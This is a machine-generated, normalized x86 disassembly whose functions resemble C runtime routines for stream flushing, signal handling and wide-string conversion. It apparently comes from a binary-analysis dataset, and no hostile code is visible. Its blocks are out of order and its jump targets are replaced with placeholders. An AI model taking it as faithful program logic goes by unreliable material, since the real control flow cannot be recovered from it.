call sub_42970c
call sub_4268f3
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
cmp edi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax ]
push edi
push esi
push sub_434827
call sub_429755
xor ecx ecx
add esp 0x18
mov [ esi + edi * 2 - 0x2 ] cx
cmp eax 0xfffffffe
jne r-xdata
mov edi [ eax ]
inc ebx
push ebx
push esi
push sub_434827
call sub_429755
add esp 0x18
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
jns r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_4268f3
cmp [ eax ] 0x22
jne r-xdata
xor ecx ecx
mov [ esi ] cx
cmp eax 0xfffffffe
jne r-xdata
call sub_4268f3
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_4268f3
mov [ eax ] edi
jmp r-xdata
call sub_4268f3
mov [ eax ] 0x22
call sub_4268f3
mov [ eax ] ebx
jmp r-xdata
sub_429a24
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429934
add esp 0x18
pop ebp
retn
sub_429a44
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_4355ef
call sub_429755
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_429a6d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_4355ef
call sub_429755
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_429a97
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_437094
pop ecx
push eax
call sub_436fc0
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_429aff
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_429a97
pop ecx
test eax eax
je r-xdata
push esi
call sub_429b47
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_437094
push eax
call sub_4370ba
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_429b47
push 0x14
push r--data
call sub_4278c0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429c18
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_427905
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_429fa1
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_429be9
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_429aff
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_429aff
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_429c21
push 0xc
push r--data
call sub_4278c0
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_429f60
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_429aff
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429c6a
mov eax [ ebp - 0x1c ]
push esi
call sub_429b47
pop ecx
jmp r-xdata
call sub_427905
retn
sub_429c7d
push 0xc
push r--data
call sub_4278c0
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] edi
setne al
cmp eax edi
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] esi
push esi
call sub_429f60
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_437193
mov ebx eax
lea eax [ ebp + 0x10 ]
push eax
push edi
push [ ebp + 0xc ]
push esi
call sub_433ba2
mov [ ebp - 0x1c ] eax
push esi
push ebx
call sub_43722f
add esp 0x1c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429cff
mov eax [ ebp - 0x1c ]
call sub_427905
retn
sub_429d93
push 0xc
push r--data
call sub_4278c0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx 0x4
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_427905
retn
mov edi [ ebp + 0x14 ]
lea eax [ edi - 0x2 ]
cmp eax 0x7ffffffd
jbe r-xdata
cmp ebx 0x40
jne r-xdata
cmp ebx 0x40
jne r-xdata
and edi 0xfffffffe
mov [ ebp + 0x8 ] esi
push esi
call sub_429f60
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_429a97
push esi
call sub_4373aa
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test bl 0x4
je r-xdata
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
or ecx 0x4
lea eax [ esi + 0x14 ]
push 0x2
pop edi
jmp r-xdata
or ecx 0x500
push edi
call sub_42acad
pop ecx
test eax eax
jne r-xdata
mov [ esi + 0xc ] ecx
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429e7f
mov eax [ ebp - 0x1c ]
sub_429e8f
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_42acf2
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_42acf2
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_429f60
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_42b166
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_429fa1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_42b166
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_429fd3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_42b075
pop ecx
pop ebp
retn
sub_42a00f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_42b075
pop ecx
pop ebp
retn
sub_42a03e
call sub_42a183
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_42a3e2
pop ecx
push 0x3
call sub_426619
int3
push 0x1
push 0x40000015
push 0x3
call sub_429543
add esp 0xc
sub_42a071
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_42a0b0
push 0x10
push r--data
call sub_4278c0
xor edi edi
push edi
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov esi rw-data
push [ rw-data ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x15
mov esi rw-data
push [ rw-data ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a12c
cmp [ ebp - 0x1c ] edi
jne r-xdata
cmp eax 0x1
je r-xdata
cmp eax edi
je r-xdata
cmp [ ebp - 0x1c ] 0x1
je r-xdata
xor eax eax
jmp r-xdata
call sub_426a4c
mov [ esi ] eax
xor eax eax
inc eax
push [ ebp - 0x20 ]
call [ ebp - 0x1c ]
pop ecx
call sub_427905
retn 0x4
sub_42a14c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_42a1a2
push 0x10
push r--data
call sub_4278c0
and [ ebp - 0x20 ] 0x0
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp esi 0x4
je r-xdata
cmp ebx 0x1
je r-xdata
cmp esi 0x3
je r-xdata
or eax 0xffffffff
cmp ebx 0x3
je r-xdata
push 0x2
pop edi
cmp ebx edi
je r-xdata
cmp ebx 0xd
je r-xdata
push 0x0
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
cmp ebx edi
je r-xdata
cmp ebx 0x15
je r-xdata
cmp ebx 0xf
jle r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x15
jne r-xdata
cmp ebx 0x16
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp ebx 0x11
jle r-xdata
mov eax ebx
sub eax edi
je r-xdata
push 0x1
push sub_42a0b0
call [ SetConsoleCtrlHandler@IAT ]
xor ecx ecx
inc ecx
cmp eax ecx
jne r-xdata
cmp ebx 0x6
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x4
je r-xdata
call sub_426906
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov [ ebp - 0x20 ] 0x1
mov esi [ ebp + 0xc ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ebx 0xf
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a3a7
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
push [ rw-data ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x9
je r-xdata
cmp ebx 0x8
je r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
jmp r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x6
je r-xdata
call sub_426bc0
mov esi eax
test esi esi
je r-xdata
cmp ebx 0x4
je r-xdata
call sub_427905
retn
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
jmp r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
dec eax
jne r-xdata
mov edi r--data
cmp [ esi + 0x5c ] edi
jne r-xdata
cmp ebx 0xb
jne r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
jmp r-xdata
push [ esi + 0x5c ]
mov edx ebx
call sub_42a14c
pop ecx
test eax eax
je r-xdata
push [ r--data ]
call sub_42acad
pop ecx
mov [ esi + 0x5c ] eax
test eax eax
je r-xdata
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
je r-xdata
push [ r--data ]
push edi
push eax
call sub_4247f0
add esp 0xc
add eax 0x4
jmp r-xdata
cmp [ eax ] ebx
je r-xdata
mov [ eax + 0x4 ] ecx
add eax 0xc
mov edx [ r--data ]
imul edx edx 0xc
add edx [ esi + 0x5c ]
lea edi [ eax - 0x4 ]
cmp edi edx
jae r-xdata
jmp r-xdata
sub_42a3e2
push 0x20
push r--data
call sub_4278c0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_426bc0
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_427905
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_42a14c
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_426619
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_42b166
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_426a4c
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a549
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_42a585
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_426a4c
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_42a6f1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
call sub_42970c
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] cx
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_4268f3
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_4268f3
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
mov edi ecx
push 0x2d
pop ecx
xor ebx ebx
mov [ esi ] cx
inc ebx
lea ecx [ esi + 0x2 ]
neg eax
add edx 0x30
add edx 0x57
jmp r-xdata
xor eax eax
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dx
add ecx 0x2
inc ebx
test eax eax
je r-xdata
mov [ ecx ] ax
sub ecx 0x2
mov [ esi ] ax
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
movzx eax [ ecx ]
mov dx [ edi ]
mov [ ecx ] dx
mov [ edi ] ax
sub ecx 0x2
add edi 0x2
cmp edi ecx
jb r-xdata
xor eax eax
call sub_42970c
mov eax esi
jmp r-xdata
sub_42a7d0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_42a6f1
pop ebp
retn
sub_42a7fa
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov ecx [ ebp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_42a6f1
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
inc eax
sub_42a83b
mov edi edi
push ebp
mov ebp esp
push ecx
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_4268f3
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] ax
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_4268f3
push 0x22
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov eax [ ebp + 0xc ]
push 0x2d
pop eax
mov [ edi ] ax
mov eax [ ebp + 0xc ]
neg ebx
adc eax ecx
lea esi [ edi + 0x2 ]
mov [ ebp - 0x4 ] 0x1
neg eax
jmp r-xdata
add ecx 0x30
add ecx 0x57
jmp r-xdata
mov [ ebp + 0x18 ] esi
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cx
mov ecx [ ebp - 0x4 ]
add esi 0x2
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
xor ecx ecx
push ecx
push [ ebp + 0x14 ]
push eax
push ebx
call sub_437480
mov [ ebp + 0xc ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] ax
sub esi 0x2
mov [ edi ] ax
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
movzx ecx [ esi ]
mov dx [ eax ]
mov [ esi ] dx
mov [ eax ] cx
add eax 0x2
sub esi 0x2
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_42970c
mov eax esi
jmp r-xdata
sub_42a93a
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
push edi
mov edi [ ebp + 0x10 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42a83b
pop edi
pop ebp
retn
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] eax
jae r-xdata
sub_42a96f
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42a83b
pop edi
pop ebp
retn
sub_42a98e
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
test ebx ebx
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
xor eax eax
mov eax esi
test edx edx
jne r-xdata
test edi edi
je r-xdata
add eax 0x2
dec edi
jne r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test ebx ebx
je r-xdata
sub eax edx
xor ecx ecx
mov [ eax ] cx
sub edx eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
jne r-xdata
dec edi
je r-xdata
movzx ecx [ edx ]
mov [ eax + edx ] cx
add edx 0x2
test cx cx
je r-xdata
jmp r-xdata
mov [ esi ] ax
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ esi + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
dec ebx
jne r-xdata
call sub_42970c
mov eax esi
jmp r-xdata
movzx ecx [ edx + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
sub_42aa64
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_42970c
mov eax esi
jmp r-xdata
sub_42ab31
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_42ab4c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
